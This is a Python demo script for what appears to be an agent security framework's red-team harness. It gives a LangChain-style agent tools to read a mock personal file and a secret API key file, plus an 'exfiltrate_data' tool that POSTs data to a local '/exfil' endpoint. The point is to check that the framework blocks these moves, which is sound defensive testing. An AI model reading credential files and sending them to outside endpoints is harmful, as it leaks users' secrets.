# examples/langchain_baf_agent/main.py

import os
import sys
from typing import Optional

# Ensure repo root on sys.path
REPO_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if REPO_ROOT not in sys.path:
    sys.path.insert(0, REPO_ROOT)

from baf_core.session import BAFSession, BAFConfig

CONFIG_PATH = "baf_config.dev_laptop.yaml"
PERSONAL_PATH = "examples/exam_helper_v1/data/personal_docs/college_id_mock_1.txt"
SECRET_PATH = "examples/exam_helper_v1/data/secrets/secret_api_key.txt"

# Single BAF session for this LangChain-like demo
baf_config = BAFConfig.from_file(CONFIG_PATH)
baf = BAFSession(
    config=baf_config,
    agent_id="langchain_langchain_agent",
    session_label=(
        baf_config.default_session_label
        or os.getenv("BAF_SESSION_LABEL")
        or "attack"
    ),
)


def read_personal_file_raw(path: str) -> str:
    """Read a personal file with full raw content (demo tool)."""
    return str(baf.safe_read_file(path=path, profile="dev_laptop", mode="raw"))


def read_secret_file_metadata(path: str) -> str:
    """Read a secret file, but only return metadata/summary (demo tool)."""
    return str(baf.safe_read_file(path=path, profile="dev_laptop", mode="metadata"))


def exfiltrate_data(url: str, data: str) -> str:
    """Send data to an HTTP endpoint (demo exfil tool)."""
    resp = baf.http_post(url=url, data=data, profile="dev_laptop")
    try:
        text = resp.text
    except Exception:
        text = str(resp)
    return f"status={resp.status_code}, body={text[:200]}"


def run_with_baf_output_modes_demo(custom_prompt: Optional[str] = None) -> None:
    """
    Deterministic demo for the red-team harness:

    1) Read the secret file via safe_read_file in metadata mode.
    2) Attempt to exfiltrate its contents via http_post.
    3) Print any BAF PermissionError or HTTP response.
    """
    print("RUN DEMO: reading secret via metadata mode...")
    try:
        meta = read_secret_file_metadata(SECRET_PATH)
        print("SECRET METADATA:", meta)
    except Exception as e:
        print("ERROR reading secret metadata:", repr(e))

    print("RUN DEMO: attempting exfil via HTTP POST...")
    try:
        result = exfiltrate_data("http://127.0.0.1:5000/exfil", "exfiltrated data placeholder")
        print("EXFIL RESULT:", result)
    except Exception as e:
        print("EXFIL ERROR:", repr(e))


if __name__ == "__main__":
    # We ignore BAF_LANGCHAIN_PROMPT now; harness just needs a deterministic flow.
    run_with_baf_output_modes_demo()
